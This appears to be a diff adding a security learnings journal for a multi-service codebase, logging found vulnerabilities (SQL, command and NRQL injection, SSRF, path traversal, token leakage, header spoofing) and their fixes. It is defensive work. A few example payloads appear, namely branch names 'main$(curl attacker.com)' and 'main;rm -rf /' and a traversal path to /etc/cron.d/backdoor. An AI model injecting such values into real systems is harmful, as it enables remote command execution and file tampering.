@@ -1,0 +1,59 @@
+## 2026-05-28 - Path Traversal via conversation_id in FileHandler (Same-Package Validation Gap)
+**Vulnerability:** `FileHandler.resolvePath()` in `file_handler.go` accepted raw `conversation_id` as a path component without validation, while `ExecutionHandler` in the same `handlers` package already validated it against `safePathRe`. The path-escape check (`filepath.Rel` + `..` prefix) only verified the file stayed inside the workspace — but the workspace directory itself was attacker-controlled via `conversation_id`, rendering the check useless.
+**Learning:** This is the third instance (after 2026-04-14 Python SQL injection, 2026-05-07 DB name injection) of sibling code paths in the same package/file having inconsistent security controls. When one handler validates an input, grep the package for every other handler that accepts the same parameter — they almost certainly don't.
+**Prevention:** When adding input validation to any handler, search the same package for all other consumers of that input (`grep -rn 'conversationID\|conversation_id' api/handlers/`). The `safePathRe` regex was already defined at package scope — the fix was a single `if` check.
+
+## 2026-01-27 - SQL Injection in Event Processor
+**Vulnerability:** Found SQL injection vulnerabilities in `TriggerNotificationForRecommendationResolution` and `TriggerNotificationForEventResolution` where `fmt.Sprintf` was used to construct SQL queries with user-controlled input (`CloudAccountId`).
+**Learning:** The vulnerability existed because of unsafe string concatenation instead of parameterization.
+**Prevention:** Always use parameterized queries (e.g., `?` or `$1` placeholders) when dealing with user input in SQL queries. Use `sqlx` or similar libraries that support binding arguments safely.
+
+## 2026-02-14 - Command Injection Bypass in CLI Tool
+**Vulnerability:** The `CLITool` relied on a static blacklist of strings (e.g., "rm -rf") to block dangerous commands, which was easily bypassed by flag variations like `rm -fr`, `rm --recursive`, or `rm -R`.
+**Learning:** Simple string matching against a blacklist is insufficient for security controls when dealing with complex CLI tools that support flexible argument parsing.
+**Prevention:** Use stricter parsing logic to inspect command arguments (e.g., checking for specific flags regardless of order) or use a strict allowlist of approved command patterns. For `rm`, explicitly check for recursive flags in all arguments.
+
+## 2026-04-09 - SSRF via Runbook WHOIS Task
+**Vulnerability:** `WhoisTask` in `runbook-server/internal/tasks/network/whois_task.go` accepted a user-controlled `server` parameter and also blindly followed `refer:`/`whois:` referrals parsed out of the upstream response, dialing TCP/43 on any host with no IP/host validation. An attacker could target loopback, RFC1918, or cloud metadata endpoints (169.254.169.254).
+**Learning:** Runbook tasks that open arbitrary outbound network connections are an SSRF vector even if the port is fixed. Follow-on requests derived from untrusted server responses need to be re-validated — trusting the first hop is not enough.
+**Prevention:** Resolve the target host and reject `IsLoopback()`, `IsPrivate()`, `IsLinkLocalUnicast/Multicast()`, `IsMulticast()`, `IsUnspecified()`, `IsInterfaceLocalMulticast()` addresses before dialing; apply the same validation to any referral/redirect returned by upstream. Use the existing `llm/llm-server/tools/tool_web_search.go` `validateURL` helper as the reference pattern for the codebase.
+
+## 2026-04-14 - SQL Injection in k8s-collector Auth Middleware (Python)
+**Vulnerability:** `AuthTokenMiddleware.get_secret_from_db()` used f-string interpolation for the `key` (from user's Authorization header) in a PostgreSQL query. `base.py` had the same pattern for `account_id`. Notably, `update_agent_last_synced_in_db` in the same file already used parameterized queries correctly.
+**Learning:** Inconsistent coding patterns within the same file are a strong signal. When one method uses safe patterns and another doesn't, the unsafe one is likely a copy-paste or earlier-written method that was never updated. Python f-string SQL is the equivalent of Go's `fmt.Sprintf` SQL — both bypass the driver's parameterization.
+**Prevention:** Grep for `cursor.execute(f"` across all Python services during security scans. The Go pattern (`fmt.Sprintf` in SQL) was already caught (2026-01-27); the Python equivalent (`f"...{var}..."` in `cursor.execute`) needs equal vigilance.
+
+## 2026-05-01 - NRQL Field Identifier Injection via Backticks
+**Vulnerability:** `buildNRQLMetricQuery` in `newrelic_metrics.go` interpolated user-supplied metric names inside backtick-delimited NRQL field references (`` `%s` ``) without escaping backticks. An `escapeNRQLField` helper (which doubles backticks) existed in the same package but wasn't used. The same file had a second vector: ad-hoc single-quote escaping that skipped backslashes, despite `escapeNRQLValue` being available.
+**Learning:** NRQL has two injection surfaces — string literals (single-quoted) and identifiers (backtick-quoted). Security scans that only grep for unescaped string interpolation in quotes miss the identifier path. Both `escapeNRQLValue` and `escapeNRQLField` must be audited as a pair.
+**Prevention:** Grep for `` fmt.Sprintf(..."` `` (backtick inside format string) in addition to `'%s'` patterns. Any NRQL field reference using user input must go through `escapeNRQLField`.
+
+## 2026-05-06 - OAuth Token Leakage via Git Error Output
+**Vulnerability:** `checkoutCodeRepo` (github.go) and `checkoutCodeRepoGitLab` (gitlab.go) embed OAuth tokens directly in git remote URLs (`https://oauth2:<token>@...`). When git clone/fetch/push fails, git's stderr often includes the full remote URL, and the code logs this output verbatim — leaking the token to application logs. The same token persists in the origin remote for subsequent fetch/push operations.
+**Learning:** Credential-in-URL is a legacy git pattern that creates a systemic leak surface: every git error path becomes a potential credential exposure. The token doesn't just leak at clone time — it stays in `.git/config` and can leak from any subsequent network operation on that repo.
+**Prevention:** Always redact git output before logging or returning in error messages. Use `redactGitCredentials()` (added in this fix) for all git output that touches network operations (clone/fetch/push). Long-term, migrate to `GIT_CONFIG_COUNT`/`GIT_CONFIG_KEY_0`/`GIT_CONFIG_VALUE_0` environment variables for auth to avoid embedding tokens in URLs entirely.
+
+## 2026-05-07 - Command Injection via Database Name in Shell-Built DB Commands
+**Vulnerability:** `tool_postgres.go` and `common_relay.go` concatenated user-supplied `database` parameters directly into shell command strings (`--dbname ` + dbName, `--database=` + dbName, `-d "` + dbName + `"`). While `query` had `sqlValidateReadOnly()` gating, the `database` parameter bypassed all validation. Oracle was already sanitized with a regex — the other four DB types (Postgres workspace, Postgres relay, MySQL relay, MSSQL relay) were not.
+**Learning:** When the same file has both safe and unsafe code paths for the same class of input (Oracle sanitized, others not), it's a strong indicator that the sanitization was added ad-hoc for one case and never applied systematically. Always audit sibling `case` branches in `switch` statements.
+**Prevention:** Grep for `+ dbName` or `+ database` patterns in shell-building code. The existing `common.ShellEscape()` should be used wherever user-controlled values enter shell strings; the Oracle regex approach is also valid but inconsistent with the rest of the codebase.
+
+## 2026-02-11 - Sensitive Data Leakage in Runbook Logs
+**Vulnerability:** The `RunScriptTask` logged the full content of scripts and arguments in debug logs, potentially exposing hardcoded secrets (e.g., API keys, passwords) embedded in scripts.
+**Learning:** Default logging behavior often includes all parameters for debugging, but this is dangerous for tasks that execute arbitrary code or commands which may contain secrets.
+**Prevention:** Implement an explicit allow-list for logging parameters. Redact or truncate sensitive fields like `script`, `args`, and `env` by default, logging only metadata (e.g., length) instead of content.
+
+## 2026-05-15 - Path Traversal in GitHub/GitLab PR Adapters
+**Vulnerability:** `updateCode()` in `github.go` and the code-change flow in both `github.go` and `gitlab.go` used `filepath.Join(dir, userPath)` with file paths sourced from cloud resource attributes and recommendation JSON data, without validating that the resolved path stays within the repository checkout directory. An attacker who controls workload annotations or recommendation payloads could write to arbitrary files on the server.
+**Learning:** `filepath.Join` does NOT prevent path traversal — `filepath.Join("/repo", "../../etc/cron.d/backdoor")` resolves to `/etc/cron.d/backdoor`. Every `filepath.Join(base, untrusted)` call must be followed by a prefix check against `base`.
+**Prevention:** Use the `safeFilePath(dir, userPath)` helper (added in `main.go`) for all file operations involving user-controlled path components. Grep for `filepath.Join(dir,` in adapter code during security reviews.
+
+## 2026-05-29 - Command Injection via Shell Interpolation in PRFollowupAgent
+**Vulnerability:** `pr_followup_agent.go` used `a.runCommandInDir("sh", "-c", fmt.Sprintf(...))` for all 9 external CLI calls (`gh`/`glab`). User-controlled `branch` (from `PRFollowupRequest.Branch`) and `repoInfo.FullPath` (parsed from user-supplied PR URL) were interpolated directly into shell command strings. A crafted branch name like `main$(curl attacker.com)` or `main;rm -rf /` would execute arbitrary commands.
+**Learning:** `exec.Command("sh", "-c", interpolatedString)` is the Go equivalent of Python's `subprocess.run(fstring, shell=True)`. The `runCommandInDir` wrapper already uses `exec.Command` with proper argument separation — the vulnerability was entirely in the *caller* choosing to route everything through `sh -c` instead of passing arguments directly. This pattern is easy to miss because the wrapper looks safe in isolation.
+**Prevention:** Grep for `"sh", "-c"` and `"bash", "-c"` across the codebase. Any call that interpolates user input into the shell string is injectable. The fix is always the same: pass the binary name and arguments separately to `exec.Command` (or `runCommandInDir`), never through a shell.
+
+## 2026-06-06 - Header Injection via x-* Forwarding in Grafana Proxy
+**Vulnerability:** `app/src/pages/api/proxy/grafana/[...grafana].ts` set security-critical headers (`X-SECRET-KEY`, `X-USER-ID`, `X-TENANT-ID`) on lines 75-78, then blindly forwarded ALL client `x-*` headers on lines 81-85. Node.js lowercases `req.headers` keys, so a client-sent `x-tenant-id` creates a SEPARATE JS object key from the pre-set `X-TENANT-ID`. When `fetch()` normalizes both to lowercase HTTP headers, the client value can overwrite the server-set identity, enabling an authenticated user to spoof their tenant/user on the relay.
+**Learning:** JS object keys are case-sensitive but HTTP headers are case-insensitive. Any proxy that sets trusted headers on a plain object and then copies untrusted headers onto the same object creates a collision vector. The relay proxy (`[relay].ts`) in the same directory does NOT have this forwarding loop — the inconsistency was the tell. Audit all proxy endpoints that forward headers for this pattern.
+**Prevention:** Maintain a `protectedHeaders` Set of lowercased header names and skip them in the forwarding loop. Alternatively, set trusted headers AFTER the loop using lowercased keys to match what `req.headers` would produce — but the explicit skip-list is clearer.
